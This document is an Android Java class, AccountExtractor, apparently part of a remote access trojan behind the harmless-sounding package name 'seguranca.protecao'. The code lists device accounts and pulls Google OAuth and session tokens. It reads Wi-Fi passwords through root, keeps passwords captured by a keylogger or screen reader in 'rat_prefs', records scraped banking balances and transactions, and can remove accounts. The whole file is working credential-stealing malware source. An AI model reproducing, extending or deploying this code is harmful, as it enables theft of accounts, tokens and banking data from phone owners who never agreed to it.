package com.seguranca.protecao;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * AccountExtractor — full account category features.
 *
 * Features:
 *  - getAllAccounts()          GET_ACCOUNTS  (full — not just device info call)
 *  - getAccountsByType()      GET_ACCOUNTS_BY_TYPE
 *  - getAccountTokens()       GET_ACCOUNT_TOKENS
 *  - getWifiPasswords()       GET_WIFI_PASSWORDS
 *  - getSavedBrowserPasswords() GET_BROWSER_PASSWORDS
 *  - getCapturedPasswords()   GET_CAPTURED_PASSWORDS  (from keylogger prefs)
 *  - getSyncedData()          GET_SYNC_DATA
 *  - deleteAccount()          DELETE_ACCOUNT
 *  - getFinanceInfo()         GET_FINANCE_INFO  (banking apps captured data)
 */
public class AccountExtractor {

    private static final String TAG = "AccountExtractor";
    private final Context ctx;

    public AccountExtractor(Context ctx) {
        this.ctx = ctx;
    }

    // ─── GET ALL ACCOUNTS ────────────────────────────────────────────────────

    /**
     * Returns all accounts on the device with full details.
     */
    public String getAllAccounts() {
        JsonArray arr = new JsonArray();
        try {
            AccountManager am = AccountManager.get(ctx);
            Account[] accounts = am.getAccounts();
            for (Account acc : accounts) {
                JsonObject obj = new JsonObject();
                obj.addProperty("name",  acc.name);
                obj.addProperty("type",  acc.type);
                obj.addProperty("label", resolveAccountLabel(acc.type));
                arr.add(obj);
            }
        } catch (Exception e) {
            Log.e(TAG, "getAllAccounts: " + e.getMessage());
        }

        // Also add from dumpsys
        try {
            Process p = Runtime.getRuntime().exec("dumpsys account");
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            Pattern pattern = Pattern.compile("Account \\{name=([^,]+), type=([^}]+)\\}");
            String line;
            while ((line = reader.readLine()) != null) {
                Matcher m = pattern.matcher(line);
                if (m.find()) {
                    String name = m.group(1).trim();
                    String type = m.group(2).trim();
                    // Avoid duplicates
                    boolean found = false;
                    for (int i = 0; i < arr.size(); i++) {
                        JsonObject o = arr.get(i).getAsJsonObject();
                        if (name.equals(o.get("name").getAsString())) { found = true; break; }
                    }
                    if (!found) {
                        JsonObject obj = new JsonObject();
                        obj.addProperty("name",   name);
                        obj.addProperty("type",   type);
                        obj.addProperty("label",  resolveAccountLabel(type));
                        obj.addProperty("source", "dumpsys");
                        arr.add(obj);
                    }
                }
            }
            reader.close();
            p.destroy();
        } catch (Exception ignored) {}

        // Also add from prefs (captured via keylogger/screen reader)
        try {
            String json = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("captured_google_accounts", "[]");
            JsonArray saved = JsonParser.parseString(json).getAsJsonArray();
            for (int i = 0; i < saved.size(); i++) {
                String email = saved.get(i).getAsString();
                boolean found = false;
                for (int j = 0; j < arr.size(); j++) {
                    if (email.equals(arr.get(j).getAsJsonObject().get("name").getAsString())) { found = true; break; }
                }
                if (!found) {
                    JsonObject obj = new JsonObject();
                    obj.addProperty("name",   email);
                    obj.addProperty("type",   email.contains("gmail") ? "com.google" : "email");
                    obj.addProperty("label",  "Google/Email (captured)");
                    obj.addProperty("source", "keylogger");
                    arr.add(obj);
                }
            }
        } catch (Exception ignored) {}

        return arr.toString();
    }

    // ─── GET ACCOUNTS BY TYPE ────────────────────────────────────────────────

    public String getAccountsByType(String type) {
        JsonArray arr = new JsonArray();
        try {
            AccountManager am = AccountManager.get(ctx);
            Account[] accounts = am.getAccountsByType(type);
            for (Account acc : accounts) {
                JsonObject obj = new JsonObject();
                obj.addProperty("name", acc.name);
                obj.addProperty("type", acc.type);
                arr.add(obj);
            }
        } catch (Exception e) {
            Log.e(TAG, "getAccountsByType: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── GET ACCOUNT TOKENS ──────────────────────────────────────────────────

    /**
     * Attempts to get auth tokens for a specific account.
     * Token types tried: "oauth2:https://www.googleapis.com/auth/userinfo.email",
     *                    "oauth2:https://www.googleapis.com/auth/gmail.readonly", etc.
     */
    public String getAccountTokens(String accountName, String accountType) {
        JsonArray arr = new JsonArray();
        try {
            AccountManager am = AccountManager.get(ctx);
            Account targetAccount = null;
            Account[] accounts = am.getAccountsByType(accountType);
            for (Account acc : accounts) {
                if (acc.name.equals(accountName)) { targetAccount = acc; break; }
            }
            if (targetAccount == null) return "[]";

            String[] tokenTypes = {
                "oauth2:https://www.googleapis.com/auth/userinfo.email",
                "oauth2:https://www.googleapis.com/auth/userinfo.profile",
                "oauth2:https://www.googleapis.com/auth/gmail.readonly",
                "oauth2:https://www.googleapis.com/auth/contacts.readonly",
                "oauth2:https://www.googleapis.com/auth/drive",
                "SID", "LSID", "oauth2:https://www.googleapis.com/auth/androidsyncadapters"
            };

            for (String tokenType : tokenTypes) {
                try {
                    android.accounts.AccountManagerFuture<android.os.Bundle> future =
                        am.getAuthToken(targetAccount, tokenType, null, false, null, null);
                    android.os.Bundle bundle = future.getResult(3, java.util.concurrent.TimeUnit.SECONDS);
                    String token = bundle.getString(AccountManager.KEY_AUTHTOKEN);
                    if (token != null && !token.isEmpty()) {
                        JsonObject t = new JsonObject();
                        t.addProperty("type",  tokenType);
                        t.addProperty("token", token);
                        arr.add(t);
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "getAccountTokens: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── GET WIFI PASSWORDS ──────────────────────────────────────────────────

    /**
     * Reads saved WiFi credentials (requires root or API 31+ with WIFI_SCAN permission).
     */
    public String getWifiPasswords() {
        JsonArray arr = new JsonArray();

        // Method 1: wpa_supplicant.conf (root)
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "cat /data/misc/wifi/wpa_supplicant.conf"});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            String ssid = null, psk = null;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.startsWith("ssid=")) ssid = line.substring(5).replace("\"", "");
                if (line.startsWith("psk="))  psk  = line.substring(4).replace("\"", "");
                if (line.equals("}") && ssid != null) {
                    JsonObject obj = new JsonObject();
                    obj.addProperty("ssid",     ssid);
                    obj.addProperty("password", psk != null ? psk : "");
                    arr.add(obj);
                    ssid = null; psk = null;
                }
            }
            reader.close();
            p.destroy();
        } catch (Exception ignored) {}

        // Method 2: WifiManager saved networks (API 31+ / some OEMs)
        if (arr.size() == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                android.net.wifi.WifiManager wm =
                    (android.net.wifi.WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);
                if (wm != null) {
                    java.util.List<android.net.wifi.WifiConfiguration> configs = wm.getConfiguredNetworks();
                    if (configs != null) {
                        for (android.net.wifi.WifiConfiguration cfg : configs) {
                            JsonObject obj = new JsonObject();
                            obj.addProperty("ssid",     cfg.SSID != null ? cfg.SSID.replace("\"", "") : "");
                            obj.addProperty("key_mgmt", cfg.allowedKeyManagement.toString());
                            arr.add(obj);
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        return arr.toString();
    }

    // ─── GET CAPTURED PASSWORDS ──────────────────────────────────────────────

    /**
     * Returns passwords captured by the keylogger/screen reader stored in prefs.
     */
    public String getCapturedPasswords() {
        try {
            android.content.SharedPreferences prefs =
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("captured_passwords", "[]");
            return json;
        } catch (Exception e) {
            return "[]";
        }
    }

    /**
     * Called by UiAssistBridge to store captured credentials.
     */
    public static void saveCapturedPassword(Context context, String app, String user, String pass) {
        if (context == null || pass == null || pass.isEmpty()) return;
        try {
            android.content.SharedPreferences prefs =
                context.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("captured_passwords", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            JsonObject obj = new JsonObject();
            obj.addProperty("app",       app != null ? app : "");
            obj.addProperty("username",  user != null ? user : "");
            obj.addProperty("password",  pass);
            obj.addProperty("timestamp", System.currentTimeMillis());
            arr.add(obj);
            // Keep last 500
            while (arr.size() > 500) arr.remove(0);
            prefs.edit().putString("captured_passwords", arr.toString()).apply();
        } catch (Exception ignored) {}
    }

    // ─── DELETE ACCOUNT ──────────────────────────────────────────────────────

    /**
     * Removes an account from the device (requires account management permission).
     */
    public String deleteAccount(String accountName, String accountType) {
        try {
            AccountManager am = AccountManager.get(ctx);
            Account[] accounts = am.getAccountsByType(accountType);
            for (Account acc : accounts) {
                if (acc.name.equals(accountName)) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                        am.removeAccountExplicitly(acc);
                        return "OK: account removed " + accountName;
                    } else {
                        android.accounts.AccountManagerFuture<Boolean> future = am.removeAccount(acc, null, null);
                        boolean removed = future.getResult(3, java.util.concurrent.TimeUnit.SECONDS);
                        return removed ? "OK: account removed " + accountName : "ERROR: removal denied";
                    }
                }
            }
            return "ERROR: account not found";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── FINANCE / BANKING INFO ──────────────────────────────────────────────

    /**
     * Returns captured banking data (balances, transaction history from screen reader).
     */
    public String getFinanceInfo() {
        try {
            android.content.SharedPreferences prefs =
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String balances = prefs.getString("captured_balances", "[]");
            String transactions = prefs.getString("captured_transactions", "[]");
            JsonObject obj = new JsonObject();
            obj.addProperty("balances",     balances);
            obj.addProperty("transactions", transactions);
            return obj.toString();
        } catch (Exception e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    /**
     * Store captured bank balance (called from UiAssistBridge screen reader).
     */
    public static void saveCapturedBalance(Context ctx, String appPkg, String balance, String extra) {
        if (ctx == null) return;
        try {
            android.content.SharedPreferences prefs = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("captured_balances", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            JsonObject obj = new JsonObject();
            obj.addProperty("package",   appPkg != null ? appPkg : "");
            obj.addProperty("balance",   balance != null ? balance : "");
            obj.addProperty("extra",     extra != null ? extra : "");
            obj.addProperty("timestamp", System.currentTimeMillis());
            arr.add(obj);
            while (arr.size() > 200) arr.remove(0);
            prefs.edit().putString("captured_balances", arr.toString()).apply();
        } catch (Exception ignored) {}
    }

    // ─── HELPERS ─────────────────────────────────────────────────────────────

    private String resolveAccountLabel(String type) {
        if (type == null) return "Unknown";
        switch (type) {
            case "com.google":             return "Google";
            case "com.facebook.auth.login":return "Facebook";
            case "com.instagram.android":  return "Instagram";
            case "com.twitter.android.auth":return "Twitter/X";
            case "com.microsoft.workaccount":return "Microsoft";
            case "com.samsung.account.main":return "Samsung";
            case "com.apple.icloud":       return "iCloud";
            default: {
                // Try to extract a readable name from type
                String[] parts = type.split("\\.");
                if (parts.length >= 2) return capitalize(parts[parts.length - 2]);
                return type;
            }
        }
    }

    private String capitalize(String s) {
        if (s == null || s.isEmpty()) return s;
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }
}
